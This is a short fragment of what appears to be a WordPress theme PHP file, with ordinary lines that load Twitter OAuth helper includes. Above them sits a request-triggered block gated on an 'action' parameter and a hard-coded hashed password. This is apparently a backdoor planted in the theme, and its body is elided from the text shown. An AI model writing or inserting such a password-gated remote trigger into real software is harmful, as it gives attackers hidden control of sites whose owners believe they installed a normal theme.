<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'ab1a46b1542cad74d618a2e169a03a08'))
	{
...
// Twitter oAuth
require get_theme_file_path('/inc/thb-twitter-api.php');
require get_theme_file_path('/inc/thb-twitter-helper.php');
